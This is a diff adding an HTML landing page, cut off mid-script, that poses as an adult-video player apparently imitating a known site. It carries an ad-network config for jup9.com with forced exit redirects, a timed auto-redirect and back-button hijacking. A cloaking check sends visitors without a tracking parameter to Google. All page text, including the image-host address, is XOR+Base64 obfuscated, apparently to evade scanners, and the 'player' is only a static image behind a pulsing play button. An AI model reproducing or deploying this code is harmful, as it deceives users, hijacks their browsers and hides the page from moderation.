@@ -1,0 +1,1565 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+      content="width=device-width,
+               initial-scale=1.0,
+               maximum-scale=1.0,
+               user-scalable=no">
+
+<title></title>
+
+
+<script>
+var APP_CONFIG = {
+    "domain": "https://jup9.com",
+    "mainExit_currentTab_zoneId": 10348755,
+    "mainExit_newTab_zoneId": 10348754,
+    "reverse_zoneId": 10348753,
+    "autoexit_zoneId": 10348756,
+    "autoexit_timeToRedirect": 90,
+    "back_zoneId": 10348757,
+    "back_count": 10
+};
+</script>
+<script>
+var p = new URLSearchParams(location.search);
+if (!p.get('var_1')) location.replace('https://www.google.com/');
+</script>
+
+<style>
+
+* {
+    box-sizing: border-box;
+}
+
+html,
+body {
+    margin: 0;
+    padding: 0;
+    background: #000;
+}
+
+body {
+    display: flex;
+    justify-content: center;
+
+    font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Helvetica,
+        Arial,
+        sans-serif;
+
+    color: #fff;
+
+    -webkit-tap-highlight-color: transparent;
+}
+
+.app-wrapper {
+
+    width: 100%;
+
+    max-width: 480px;
+
+    background: #0d0d11;
+
+    min-height: 100vh;
+
+    display: flex;
+
+    flex-direction: column;
+
+    position: relative;
+
+    padding-bottom: 90px;
+}
+
+.header-top {
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+
+    padding: 15px;
+}
+
+.logo {
+
+    font-size: 24px;
+
+    font-weight: 900;
+
+    letter-spacing: 2px;
+
+    text-transform: uppercase;
+
+    color: #fff;
+
+    display: flex;
+
+    align-items: center;
+
+    gap: 6px;
+}
+
+.logo span {
+
+    color: #00e5ff;
+
+    font-size: 18px;
+
+    line-height: 1;
+}
+
+.auth-buttons {
+
+    display: flex;
+
+    gap: 8px;
+}
+
+.btn-sign {
+
+    background: transparent;
+
+    border: 2px solid #00e5ff;
+
+    color: #fff;
+
+    padding: 6px 10px;
+
+    font-size: 11px;
+
+    font-weight: bold;
+
+    border-radius: 2px;
+
+    text-transform: uppercase;
+}
+
+.btn-join {
+
+    background: #00e5ff;
+
+    border: 2px solid #00e5ff;
+
+    color: #000;
+
+    padding: 6px 10px;
+
+    font-size: 11px;
+
+    font-weight: bold;
+
+    border-radius: 2px;
+
+    text-transform: uppercase;
+}
+
+.nav-categories {
+
+    display: flex;
+
+    padding: 0 15px;
+
+    gap: 18px;
+
+    border-bottom: 1px solid #222;
+
+    overflow-x: auto;
+
+    scrollbar-width: none;
+}
+
+.nav-categories::-webkit-scrollbar {
+    display: none;
+}
+
+.nav-item {
+
+    color: #aaa;
+
+    text-decoration: none;
+
+    font-size: 12px;
+
+    font-weight: bold;
+
+    padding: 10px 0;
+
+    text-transform: uppercase;
+
+    white-space: nowrap;
+}
+
+.nav-item.active {
+
+    color: #00e5ff;
+
+    border-bottom: 2px solid #00e5ff;
+}
+
+.nav-item.premium {
+
+    color: #ffd700;
+}
+
+.hero-container {
+
+    position: relative;
+
+    width: 100%;
+
+    aspect-ratio: 9 / 16;
+
+    background: #111;
+
+    margin-top: 15px;
+
+    overflow: hidden;
+}
+
+.xh-frame {
+
+    position: absolute;
+
+    inset: 0;
+
+    width: 100%;
+
+    height: 100%;
+
+    object-fit: cover;
+
+    opacity: 0;
+
+    transition: opacity 0.5s ease;
+}
+
+.xh-frame.loaded {
+    opacity: 1;
+}
+
+.xh-loader {
+
+    position: absolute;
+
+    top: 50%;
+
+    left: 50%;
+
+    width: 40px;
+
+    height: 40px;
+
+    border:
+        3px solid
+        rgba(0, 229, 255, 0.2);
+
+    border-top-color: #00e5ff;
+
+    border-radius: 50%;
+
+    transform:
+        translate(-50%, -50%);
+
+    animation:
+        spin 1s linear infinite;
+
+    z-index: 10;
+}
+
+@keyframes spin {
+
+    to {
+
+        transform:
+            translate(-50%, -50%)
+            rotate(360deg);
+    }
+}
+
+.player-play {
+
+    position: absolute;
+
+    top: 50%;
+
+    left: 50%;
+
+    width: 64px;
+
+    height: 64px;
+
+    transform:
+        translate(-50%, -50%);
+
+    border-radius: 50%;
+
+    background:
+        rgba(255, 255, 255, 0.88);
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+
+    z-index: 20;
+
+    pointer-events: none;
+
+    animation:
+        playPulse 2s ease-in-out infinite;
+
+    box-shadow:
+        0 4px 20px
+        rgba(0, 0, 0, 0.35);
+}
+
+.player-play::after {
+
+    content: "";
+
+    width: 0;
+
+    height: 0;
+
+    border-top:
+        11px solid transparent;
+
+    border-bottom:
+        11px solid transparent;
+
+    border-left:
+        17px solid #111;
+
+    margin-left: 4px;
+}
+
+@keyframes playPulse {
+
+    0% {
+
+        transform:
+            translate(-50%, -50%)
+            scale(1);
+
+        opacity: 0.88;
+    }
+
+    50% {
+
+        transform:
+            translate(-50%, -50%)
+            scale(1.08);
+
+        opacity: 1;
+    }
+
+    100% {
+
+        transform:
+            translate(-50%, -50%)
+            scale(1);
+
+        opacity: 0.88;
+    }
+}
+
+.player-play::before {
+
+    content: "";
+
+    position: absolute;
+
+    inset: -8px;
+
+    border-radius: 50%;
+
+    border:
+        1px solid
+        rgba(255, 255, 255, 0.35);
+
+    animation:
+        playRing 2s ease-in-out infinite;
+}
+
+@keyframes playRing {
+
+    0% {
+
+        transform: scale(0.92);
+
+        opacity: 0.35;
+    }
+
+    50% {
+
+        transform: scale(1.08);
+
+        opacity: 0;
+    }
+
+    100% {
+
+        transform: scale(0.92);
+
+        opacity: 0.35;
+    }
+}
+
+.content-grid {
+
+    display: grid;
+
+    grid-template-columns:
+        1fr 1fr;
+
+    gap: 8px;
+
+    padding: 12px;
+}
+
+.grid-item {
+
+    position: relative;
+
+    width: 100%;
+
+    aspect-ratio: 3 / 4;
+
+    background: #222;
+
+    border-radius: 4px;
+
+    overflow: hidden;
+}
+
+.grid-item img {
+
+    width: 100%;
+
+    height: 100%;
+
+    display: block;
+
+    object-fit: cover;
+}
+
+.grid-item.full-width {
+
+    grid-column: 1 / -1;
+
+    aspect-ratio: 16 / 9;
+}
+
+.grid-overlay {
+
+    position: absolute;
+
+    bottom: 0;
+
+    left: 0;
+
+    width: 100%;
+
+    background:
+        linear-gradient(
+            transparent,
+            rgba(0, 0, 0, 0.9)
+        );
+
+    padding:
+        20px 10px 10px;
+
+    text-align: center;
+}
+
+.grid-title {
+
+    font-size: 11px;
+
+    font-weight: bold;
+
+    color: #fff;
+
+    display: -webkit-box;
+
+    -webkit-line-clamp: 2;
+
+    -webkit-box-orient: vertical;
+
+    overflow: hidden;
+}
+
+.bottom-cta-wrapper {
+
+    position: fixed;
+
+    bottom: 0;
+
+    width: 100%;
+
+    max-width: 480px;
+
+    background:
+        rgba(13, 13, 17, 0.95);
+
+    padding: 15px;
+
+    border-top: 1px solid #222;
+
+    z-index: 50;
+
+    backdrop-filter: blur(5px);
+}
+
+.btn-cta {
+
+    background: #00e5ff;
+
+    color: #000;
+
+    border: none;
+
+    width: 100%;
+
+    padding: 16px;
+
+    font-size: 16px;
+
+    font-weight: 900;
+
+    border-radius: 4px;
+
+    text-transform: uppercase;
+
+    letter-spacing: 1px;
+
+    box-shadow:
+        0 4px 15px
+        rgba(0, 229, 255, 0.3);
+
+    animation:
+        pulseCTA 2s infinite;
+}
+
+@keyframes pulseCTA {
+
+    0% {
+
+        transform: scale(1);
+    }
+
+    50% {
+
+        transform: scale(1.02);
+
+        box-shadow:
+            0 4px 20px
+            rgba(0, 229, 255, 0.5);
+    }
+
+    100% {
+
+        transform: scale(1);
+    }
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+
+<div class="app-wrapper xh-fake-player"
+     style="cursor: pointer;">
+
+    <header class="header-top">
+
+        <div class="logo">
+            <span class="logo-main"></span>
+            <span class="logo-dot"></span>
+            <span class="logo-name"></span>
+        </div>
+
+        <div class="auth-buttons">
+
+            <div class="btn-sign"></div>
+
+            <div class="btn-join"></div>
+
+        </div>
+
+    </header>
+
+
+    <nav class="nav-categories">
+
+        <div class="nav-item active"
+             data-lang-key="all"></div>
+
+        <div class="nav-item"
+             data-lang-key="trans"></div>
+
+        <div class="nav-item"
+             data-lang-key="lesbian"></div>
+
+        <div class="nav-item"
+             data-lang-key="milf"></div>
+
+        <div class="nav-item"
+             data-lang-key="animation"></div>
+
+        <div class="nav-item"
+             data-lang-key="vr"></div>
+
+        <div class="nav-item premium"
+             data-lang-key="premium"></div>
+
+    </nav>
+
+
+    <div class="hero-container">
+
+        <img
+            class="xh-frame"
+            id="frame"
+            decoding="async">
+
+        <div
+            class="xh-loader"
+            id="loader">
+        </div>
+
+        <div
+            class="player-play"
+            aria-hidden="true">
+        </div>
+
+    </div>
+
+
+    <div class="content-grid">
+
+
+        <div class="grid-item">
+
+            <img
+                id="vertical-1"
+                decoding="async">
+
+            <div class="grid-overlay">
+
+                <div class="grid-title dynamic-text"></div>
+
+            </div>
+
+        </div>
+
+
+        <div class="grid-item">
+
+            <img
+                id="vertical-2"
+                decoding="async">
+
+            <div class="grid-overlay">
+
+                <div class="grid-title dynamic-text"></div>
+
+            </div>
+
+        </div>
+
+
+        <div class="grid-item full-width">
+
+            <img
+                id="horizontal-random"
+                decoding="async">
+
+            <div class="grid-overlay">
+
+                <div class="grid-title dynamic-text"></div>
+
+            </div>
+
+        </div>
+
+
+    </div>
+
+
+    <div class="bottom-cta-wrapper">
+
+        <button
+            class="btn-cta"
+            id="t-cta">
+        </button>
+
+    </div>
+
+
+</div>
+
+
+
+<script>
+
+/*
+ * String decoder.
+ *
+ * XOR + Base64.
+ *
+ * No eval().
+ */
+
+(function(){
+
+    const KEY = 73;
+
+
+    window._sx =
+        function(value){
+
+            const raw =
+                atob(value);
+
+            const bytes =
+                new Uint8Array(
+                    raw.length
+                );
+
+
+            for(
+                let i = 0;
+                i < raw.length;
+                i++
+            ){
+
+                bytes[i] =
+                    raw.charCodeAt(i)
+                    ^ KEY;
+
+            }
+
+
+            return new TextDecoder()
+                .decode(bytes);
+
+        };
+
+
+})();
+
+</script>
+
+
+
+<script>
+
+(function(){
+
+    const S = window._sx;
+
+
+    /*
+     * Text resources.
+     */
+
+    const TEXT = {
+
+
+        en: {
+
+            cta:
+                "DzssLGl6aS0oMDppZGkDJiAnaQcmPmg=",
+
+            random: [
+
+                "DDEqJTw6ID8saX0CaQomJz0sJz1pPDktKD0sLWktKCAlMGdnZw==",
+
+                "HTssJy0gJy5pICdpMCY8O2k7LC4gJidpOyAuIT1pJyY+Z2dn",
+
+                "Gj0sOWQ6IDo9LDtpLiw9Omk6PTwqImkoJy1pKDoiOmkvJjtnZ2c=",
+
+                "ASg7LSomOyxpOiosJyxpLyY7aShpMCY8Jy5pKiYlJSwuLGk6PTwtLCc9Z2dn",
+
+                "ASYkLCQoLSxzaSE8OisoJy1pKig9KiEsOmk+IC8sZ2dn",
+
+                "HSY5aTsoPSwtaToqLCcsaSYvaT0hLGk+LCwiZ2dn"
+
+            ]
+
+        },
+
+
+        ru: {
+
+            cta:
+                "mdiZ/JjImfaZ8pn5mMuZ9Jn3aXppmf2Z9JjGaWRpmeiZ9Zn3mMuYyZn8mMuYxWg=",
+
+            random: [
+
+                "meSZ85jImfOZ8pjHmf6Z8Zn7aZn7aX0CaZn3mfiZ9Jn3mfuZ8pjGmfyYy5jImMZpmfyZ/5n8mf2Z9Jn8mfuZ9Jn3Z2dn",
+
+                "mdtpmMuYyZn8mfSZ/Zn8aZn7aZjLmfuZ95n8mfVpmMmZ/Jn6mfGZ95n0mfxpmfaYyZjGmfWZ92mYyJn8mfCYzpn5mMhnZ2c=",
+
+                "meiZ+5n3mf2Z9Jn5mMZpmMiZ/JjImMuYyZn5aZn+mfmYyJjLmMmYxpnymflpmfFpmfaYyZn3mMiZ8ZjLaZn3Z2dn",
+
+                "md+Z/JjImMuZ85n5mMZpmMiYz5n8mfSZ+WmYyGmZ9Zn3mfKZ95n9mfeZ8GmYyJjLmMqZ/Zn8mfSYy5nzmfeZ8GdnZw==",
+
+                "md2Z95n1mfmYwZn0mfyZ/GmZ+5nxmf2Z/Jn3c2mZ9ZjKmf9pmf6Z+ZjImMuYypnzmfmZ8mmZ/5n8mfSYymdnZw==",
+
+                "mdKYypjOmMGZ/Jn8aZn7mfGZ/Zn8mfdpmMSYy5n3mfBpmfSZ/Jn9mfyZ8pnxZ2dn"
+
+            ]
+
+        },
+
+
+        es: {
+
+            cta:
+                "DjsoPSA6aXppLYrkKDppZGmL6IrTJyw9LGkoISY7KGg=",
+
+            random: [
+
+                "CiYnPSwnIC0maSwxKiU8OiA/JmksJ2l9AmdnZw==",
+
+                "HSwnLSwnKiAoaSwnaT08aTssLiCK+idpKCEmOyhpJCA6JCZnZ2c=",
+
+                "ASw7JCgnKDo9OyhpOixpKD0oOiooaTBpOSAtLGdnZw==",
+
+                "DDoqLCcoaSEoOy0qJjssaTkoOyhpPCcgPyw7OiA9KDsgKGdnZw==",
+
+                "Cig6LDsmc2kkKDsgLSZpOSAlJShpKGk6PGkkPCMsO2dnZw==",
+
+                "DCVpP4rkLSwmaSSK6DppPyglJjsoLSZpLSxpJShpOiwkKCcoZ2dn"
+
+            ]
+
+        },
+
+
+        bn: {
+
+            cta:
+                "qe7gaanv76nv9qnv4Wmp7+Wp7/ap7+Gp7/ep7+ep7sup7/up7sSp7+ap7s5pZGmp78ap79+p7+Gp785pqe/mqe7Cqe/eaanv76nv9qnv4Wg=",
+
+            random: [
+
+                "qe/Gqe/cqe7Eqe/xqe/cqe7Eqe/7qe7Iqe/xqe/2qe/kaX0Caav3Knv4anv1qnuzqnv4anuxKnv1mmp7+Op7sSp7/mp7+2p7/ap7++p7/ap7+Fpqe/Pqe/jqe/oqe7Oqe/Waanv8Knv5qnv9WdnZw==",
+
+                "qe/Pqe/jqe/hqe/3qe/5aanvzKnv16nuxKnv06nv+6nuzmmp78ap79+p7+Gp785pqe/Wqe7Eqe/5qe7Oqe/hqe7Eqe/oqe/2qe/LZ2dn",
+
+                "qe/Gqe/cqe7Eqe/xqe/cqe7Eqe/7qe7Iqe/xqe/2qe/kaanv5Knv9qnv6Knv9qnv2mmp78ap79+p7+Fpqe/vqe7Oqe/fqe7Iqe/hZ2dn",
+
+                "qe/hqe/tqe7Iqe/haanv5Knv9qnv6Knv9qnv2mmp7+Op7sSp7/mp7+2p7/ap7++p7/ap7+Fpqe/Pqe/jqe/oqe7Oqe/Waanv8Knv06nuxKnv0qnuzmdnZw==",
+
+                "qe/xqe/lqe/Tqe7Oqe/mqe/1qe7Oaanv1anv4anv46nuxKnv+anv9qnv5qnv9Wmp7+Sp7/ap7+ip7/ap79qp796p7sip7/up7sJpqe/vqe7Oqe/fqe7Iqe/hZ2dn",
+
+                "qe/Gqe/Oaanv8anv46nuxKnv7anv96nt8Gmp7dyp7fdpqe3xqe3lqe3xqezOaantzKnt06nsxKnt0qnt92mp7fyp7Mmp7eip7fap7eap7MJnZ2c="
+
+            ]
+
+        },
+
+
+        hi: {
+
+            cta:
+                "emmp7e+p7fap7eFpqe3nqezIqe3iqezEqe3taWRpqe3Mqe3kqezJaant1ansyKnt6Knt9anszqnty2g=",
+
+            random: [
+
+                "qe3Gqe3cqezEqe3xqe3cqezEqe37qezLqe3xqe32qe38aX0Caant3Knty6nt1qnszqnty6nt1mmp7fmp7MKp7dWp7fVpqe3Mqe3jqe3oqezOqe3Waant8Knswqnt7ant92mp7fCp7MFnZ2c=",
+
+                "qe3Mqe3kqezJaantz6nt46nt3Knszmmp7dyp7MSp7f6p7M6p7e2p7MSp7flpqe3nqezOqe3Laant1qnsxKnt+anszqnty6nt6Knt9qnty6nt3mdnZw==",
+
+                "qe3Gqe3cqezEqe3xqe3cqezEqe37qezLqe3xqe32qe38aant/Knsyant6Knt9qnt5qnswmmp7cyp7eSp7Mlpqe3vqezOqe3fqezOqe3LZ2dn",
+
+                "qe3hqe3Gaant/Knsyant6Knt9qnt5qnswmmp7fmp7MKp7dWp7fVpqe3Mqe3jqe3oqezOqe3Waant8Knswqnt7anszmmp7fCp7MGp7ctnZ2c=",
+
+                "qe3xqe3lqe3xqezOaant+6nswqnt3Knt46nsxKnt+ant9qnt5mmp7fyp7Mmp7eip7fap7eap7MJpqe3vqezOqe3fqezOqe3LZ2dn",
+
+                "qe3Oqe3xaant8ant46nsxKnt7ant96nt8Gmp7dyp7fdpqe3xqe3lqe3xqezOaantzKnt06nsxKnt0qnt92mp7fyp7Mmp7eip7fap7eap7MJnZ2c="
+
+            ]
+
+        },
+
+
+        th: {
+
+            cta:
+                "qfHWqfHqqfH8aXppqfHuqfH4qfHQaWRpqfDJqfHLqfDAqfH7qfHqqfDBqfHuqfHoqfDJqfHsqfHraA==",
+
+            random: [
+
+                "qfHNqfHkqfHQqfDJqfHeqfHQqfHcqfDFaX0Caanx16nx/anwyanx4anx4Knx5Knx+Knx0qnwyanx3anx3Knx3qnx8anxyKnx7qnx+Knx0GdnZw==",
+
+                "qfHIqfH6qfHsqfH4qfHOqfDJqfHSqfDOqfHQqfHeqfH8qfDBqfHQqfH9qfHrqfHoqfDKqfHQqfHXqfH+qfDAqfHQqfHeqfH8qfDBqfHLqfHkqfHOqfHNqfHxqfHaqfHcqfHkqfHQqfHQqfH8qfDAZ2dn",
+
+                "qfHDqfHoqfHuqfH9qfHdqfH8qfDLqfHkqfHXqfH9qfDJqfHhqfHgqfDNqfHdqfDAqfDJqfHsqfHrZ2dn",
+
+                "qfHuqfH9qfHdqfH8qfDLqfHkqfDKqfHiqfHoqfDBqfHkqfH4qfHSqfDJqfHdqfHcqfHeqfHxqfHIqfHuqfH4qfHQZ2dn",
+
+                "qfHDqfHoqfHuqfH9qfHdqfH8qfDLqfHkqfHrqfHkqfHdqfHQqfH9qfHrqfHoqfHcqfHkqfHQqfHQqfH8qfDAZ2dn",
+
+                "qfHuqfH9qfHdqfH8qfDLqfHkqfDJqfHdqfDBqfHQqfHSqfHqqfH5qfHBqfH6qfHjqfH4qfHSqfHdqfH7qfHiqfDFZ2dn"
+
+            ]
+
+        },
+
+
+        my: {
+
+            cta:
+                "emmoydKoycmoyfNpqMnoqMnIqMnQqMn7qMn+aWRpqMnTqMnIqMnmqMncqMn7aajJ3KjJ4qjJ1KjJzajJ86jJ3KjJ4mg=",
+
+            random: [
+
+                "qMnoqMnYqMn5qMnxaX0CaajJ6KjJyajJ9ajJ+KjJ5ajJzajJ86jJ8ajJ6KjJ0qjJ5ajJ0KjJ8qjJ5ajJ8ajJyajJ5KjJ5mmoyd2oyfioyf6oycyoycCoyfOoyeioydyoyfOoyduoyeSoydmoyfOoydWoyeaoydyoyfOoydeoycOoyfNnZ2c=",
+
+                "qMnXqMnNqMn+qMnzqMnbqMn4qMnXqMnZqMn0qMnNqMnzaajJ06jJyKjJ5qjJyKjJ+KjJ2ajJ86jJzKjJ5ajJ8ajJ3ajJ+KjJ16jJw6jJ82dnZw==",
+
+                "qMnoqMnYqMn5qMnxqMneqMnnqMnbqMnnqMnTqMnkqMnmqMnQqMnyqMnlqMnxqMnJqMnkqMnmaajJ06jJyKjJ5qjJ3KjJ+6jJyajJ9ajJw6jJ/qjJ86jJ3KjJ4mdnZw==",
+
+                "qMneqMnnqMnbqMnnqMnTqMnkqMnmqMnoqMnXqMnMqMnzqMnQqMnyqMnlqMnxqMnxaajJ3ajJ+KjJ/qjJzKjJwKjJ86jJ6KjJ3KjJ86jJ26jJ5KjJ2ajJ86jJ1ajJ5qjJ3KjJ86jJ16jJw6jJ82dnZw==",
+
+                "qMnVqMn5qMnJqMn1qMnkqMnmqMnJqMnzqMnQqMnyqMnlqMnxqMnXqMn4qMnlqMneqMnnqMnbqMnnqMnTqMnkqMnmqMnQqMnyqMnlqMnxqMnJqMnkqMnmaajJyajJ9ajJw6jJ/qjJ86jJ3KjJ4mdnZw==",
+
+                "qMnbqMnnqMnoqMncqMnZqMnzqMnSqMn7qMn+aajJ6KjJyajJ+KjJ5ajJzajJ86jJ8ajJz6jJ5qjJ/6jJ8ajJ3qjJ56jJ26jJ56jJ06jJ5KjJ5mdnZw=="
+
+            ]
+
+        },
+
+
+        ms: {
+
+            cta:
+                "GSw7KjwkKGl6aSEoOyBpZGkaLDs9KCBpOiwiKDsoJy5o",
+
+            random: [
+
+                "AignLTwnLignaX0CaSwiOiIlPDogL2ktICIsJCg6aSIgJyBpOiw9ICg5aSEoOyBnZ2c=",
+
+                "GiwtKCcuaT07LCctICcuaS0gaSIoPig6KCdpKCctKGk6LCIoOygnLmdnZw==",
+
+                "HSYnPSYnaT8gLSwmaSwiOiIlPDogL2k6LCIoOygnLmdnZw==",
+
+                "HyAtLCZpKyghKDs8aS0gIiwkKDppIiAnIGk6LD0gKDlpISg7IGdnZw==",
+
+                "HSYnPSYnaT8gLSwmaTkoJSAnLmk5Jjk8JSg7aTosIig7KCcuZ2dn",
+
+                "HyAtLCZpPSw7KyggImkkICcuLjxpICcgZ2dn"
+
+            ]
+
+        },
+
+
+        id: {
+
+            cta:
+                "DjsoPSA6aXppISg7IGlkaQ4oKzwnLmk6LCIoOygnLmg=",
+
+            random: [
+
+                "AiYnPSwnaX0CaSwiOiIlPDogL2ktIDksOysoOzwgaTosPSAoOWkhKDsgZ2dn",
+
+                "GiwtKCcuaT07LCdpLSBpPiAlKDAoIWkIJy0oaTosIig7KCcuZ2dn",
+
+                "HSYnPSYnaT8gLSwmaSwiOiIlPDogL2k6LCIoOygnLmdnZw==",
+
+                "HyAtLCZpKyg7PGktIDksOysoOzwgaTosPSAoOWkhKDsgZ2dn",
+
+                "HSYnPSYnaT8gLSwmaTkoJSAnLmk5Jjk8JSw7aTosIig7KCcuZ2dn",
+
+                "HyAtLCZpPSw7KyggImkkICcuLjxpICcgZ2dn"
+
+            ]
+
+        },
+
+
+        ar: {
+
+            cta:
+                "kMyR5ZHukM+QwpHuaZDNkMyR5pHgaXppkeqQw5HukMxpZGmR7pDPkf+QzGmR7pDNkeuQz2g=",
+
+            random: [
+
+                "kMyR5JHjkMGQwGmR5JH8kfiQw2mR4ZHlkMGR5pHgaX0CaZDDkeOQzGmR45HkkeaQw5HikM5pkMOQwZDMkMOQwpHuZ2dn",
+
+                "ke6QzZHqkMqR4pH4aZH4kMGR7pHlkMKR7mmQyJDDaZDMkM+R/pDLkeOQymmR7pDNkeuQz2dnZw==",
+
+                "kf2R7pDOkeZpke6QzZDIkMOR5pDDkMGQzpHukeNpke6QzZHkkfyR+JDDkeBpke6QzZHrkM9nZ2c=",
+
+                "kMiQw5HmkMOQwZDOke6R42mR5ZHmkMOR5pHgaZDDkeOQzGmR45HkkeaQw5HikM6R7mmQw5DBkMyQw5DCke5nZ2c=",
+
+                "kf2R7pDOkeZpke6QzZDIkMOR5pDDkMGQzpHukeNpke6QzZHqkMqR4pH4aZH9kfCR4ZDDkeBpke6QzZHrkM9nZ2c=",
+
+                "keqQyJH/kM1pkMiQw5HmkMOQwWmQzZDOkfmR7mmR7pDNkeqR+pHhkMGR8GdnZw=="
+
+            ]
+
+        },
+
+
+        fr: {
+
+            cta:
+                "emkjJjw7OmkuOyg9PCA9OmlkaRssIyYgLicsM2QnJjw6aWg=",
+
+            random: [
+
+                "CiYnPSwnPGksMSolPDogL2ksJ2l9AmkkIDppiulpIyY8O2kqISg4PCxpIyY8O2dnZw==",
+
+                "HSwnLSgnKixpLSgnOmk/Jj07LGk7iuAuICYnaSwnaSosaSQmJCwnPWdnZw==",
+
+                "DYrgKiY8PzssM2klLDppPyAtiuAmOmksMSolPDogPyw6aSQoICc9LCcoJz1nZ2c=",
+
+                "DSxpJyY8PywlJSw6aT8gLYrgJjppKCMmPD2K4Cw6aSohKDg8LGkjJjw7Z2dn",
+
+                "DYrgKiY8PzssM2klLDppPyAtiuAmOmklLDppOSU8Omk5Jjk8JSggOyw6Z2dn",
+
+                "BShpJCwgJSUsPDssaT8gLYrgJmktLGklKGk6LCQoICcsZ2dn"
+
+            ]
+
+        }
+
+    };
+
+
+    const UI = {
+
+        logoMain:
+            "AQYd",
+
+        logoDot:
+            "q8nr",
+
+        logoName:
+            "CgEAHwIa",
+
+        signIn:
+            "GgAOB2kABw==",
+
+        join:
+            "AwYAB2kHBh4=",
+
+        all:
+            "CAUF",
+
+        trans:
+            "HRsIBxo=",
+
+        lesbian:
+            "BQwaCwAIBw==",
+
+        milf:
+            "BAAFDw==",
+
+        animation:
+            "CAcABAgdAAYH",
+
+        vr:
+            "Hxs=",
+
+        premium:
+            "GRsMBAAcBA=="
+
+    };
+
+
+    const LANGS = [
+        "en",
+        "ru",
+        "es",
+        "bn",
+        "hi",
+        "th",
+        "my",
+        "ms",
+        "id",
+        "ar",
+        "fr"
+    ];
+
+
+    function detectLanguage(){
+
+        const langs =
+            navigator.languages &&
+            navigator.languages.length
+                ? navigator.languages
+                : [
+                    navigator.language ||
+                    "en"
+                ];
+
+
+        for(
+            let i = 0;
+            i < langs.length;
+            i++
+        ){
+
+            const lang =
+                String(langs[i])
+                    .slice(0, 2)
+                    .toLowerCase();
+
+
+            if(
+                LANGS.indexOf(lang) !== -1
+            ){
+
+                return lang;
+
+            }
+
+        }
+
+
+        return "en";
+
+    }
+
+
+    const userLang =
+        detectLanguage();
+
+
+    const T =
+        TEXT[userLang] ||
+        TEXT.en;
+
+
+    document.documentElement.lang =
+        userLang;
+
+
+    document.title =
+        S(
+            "AQYdaavJ62kKAQAfAhppGQUIEAwb"
+        );
+
+
+    const logoMain =
+        document.querySelector(
+            ".logo-main"
+        );
+
+    const logoDot =
+        document.querySelector(
+            ".logo-dot"
+        );
+
+    const logoName =
+        document.querySelector(
+            ".logo-name"
+        );
+
+    const signIn =
+        document.querySelector(
+            ".btn-sign"
+        );
+
+    const join =
+        document.querySelector(
+            ".btn-join"
+        );
+
+
+    logoMain.textContent =
+        S(UI.logoMain);
+
+    logoDot.textContent =
+        S(UI.logoDot);
+
+    logoName.textContent =
+        S(UI.logoName);
+
+    signIn.textContent =
+        S(UI.signIn);
+
+    join.textContent =
+        S(UI.join);
+
+
+    const navElements =
+        document.querySelectorAll(
+            "[data-lang-key]"
+        );
+
+
+    navElements.forEach(
+        function(el){
+
+            const key =
+                el.getAttribute(
+                    "data-lang-key"
+                );
+
+
+            if(
+                UI[key]
+            ){
+
+                el.textContent =
+                    S(UI[key]);
+
+            }
+
+        }
+    );
+
+
+    const cta =
+        document.getElementById(
+            "t-cta"
+        );
+
+
+    if(cta){
+
+        cta.textContent =
+            S(T.cta);
+
+    }
+
+
+    const titles =
+        document.querySelectorAll(
+            ".dynamic-text"
+        );
+
+
+    titles.forEach(
+        function(el){
+
+            const index =
+                Math.floor(
+                    Math.random() *
+                    T.random.length
+                );
+
+
+            el.textContent =
+                S(T.random[index]);
+
+        }
+    );
+
+
+})();
+
+</script>
+
+
+
+<script>
+
+(function(){
+
+    const S =
+        window._sx;
+
+
+    /*
+     * Main player CDN.
+     */
+
+    const CDN =
+        S(
+            "IT09OTpzZmYgJC5nOj0oMCUmJywxPWcqJiQ="
+        );
+
+
+    const params =
+        new URLSearchParams(
+            location.search
+        );
+
+
+    const campaignId =
+        params.get(
+            "campaignid"
+        );
+
+
+    const creativeId =
+        params.get(
+            "creative_id"
+        );
+
+
+    const frame =
+        document.getElementById(
+            "frame"
+        );
+
+
+    const loader =
+        document.getElementById(
+            "loader"
+        );
+
+
+    if(
+        campaignId &&
+        creativeId
+    ){
+
+        const image =
+            new Image();
+
+
+        image.onload =
+            function(){
+
+                frame.src =
+                    image.src;
+
+
+                requestAnimationFrame(
+                    function(){
+
+                        frame.classList.add(
+                            "loaded"
+                        );
+
+                    }
+                );
+
+
+                loader.style.display =
+                    "none";
+
+            };
+
+
+        image.onerror =
+            function(){
+
+                loader.style.display =
+                    "none";
+
+            };
+
+
+        /*
+         * URL:
+         *
+         * CDN / campaignid / creative_id.webp
+         */
+
+        image.src =
+            CDN +
+            "/" +
+            encodeURIComponent(
+                campaignId
+            ) +
+            "/" +
+            encodeURIComponent(
+                creativeId
+            ) +
+            ".webp";
+
+    }
+    else {
+
+        setTimeout(
+            function(){
+
+                loader.style.display =
+                    "none";
+
+            },
+            3000
+        );
+
+    }
+
+})();
+
+</script>
+
+
+
+<script>
+
+(function(){
+
+    const S =
+        window._sx;
+
+
+    /*
+     * Four possible vertical images.
+     */
+
+    const verticalImages = [
+
+        S(
+            "Z2YoOjosPTpmICQoLiw6Zj8sOz0gKiglZnhnPiwrOQ=="
+        ),
+
+        S(
+            "Z2YoOjosPTpmICQoLiw6Zj8sOz0gKiglZntnPiwrOQ=="
+        ),
+
+        S(
+            "Z2YoOjosPTpmICQoLiw6Zj8sOz0gKiglZnpnPiwrOQ=="
+        ),
+
+        S(
+            "Z2YoOjosPTpmICQoLiw6Zj8sOz0gKiglZn1nPiwrOQ=="
+        )
+
+    ];
+
+
+    /*
+     * Horizontal images.
+     */
+
+    const horizontalImages = [
+
+        S(
+            "Z2YoOjosPTpmICQoLiw6ZnhnPiwrOQ=="
+        ),
+
+        S(
+            "Z2YoOjosPTpmICQoLiw6ZntnPiwrOQ=="
+        ),
+
+        S(
+            "Z2YoOjosPTpmICQoLiw6ZnpnPiwrOQ=="
+        )
+
+    ];
+
+
+    /*
+     * Fisher-Yates shuffle.
+     */
+
+    for(
+        let i = verticalImages.length - 1;
+        i > 0;
+        i--
+    ){
+
+        const j =
+            Math.floor(
+                Math.random() *
+                (i + 1)
+            );
+
+
+        const temp =
+            verticalImages[i];
+
+
+        verticalImages[i] =
+            verticalImages[j];
+
+
+        verticalImages[j] =
+            temp;
+
+    }
+
+
+    /*
+     * Only TWO vertical images
+     * are loaded.
+     */
+
+    const vertical1 =
+        document.getElementById(
+            "vertical-1"
+        );
+
+
+    const vertical2 =
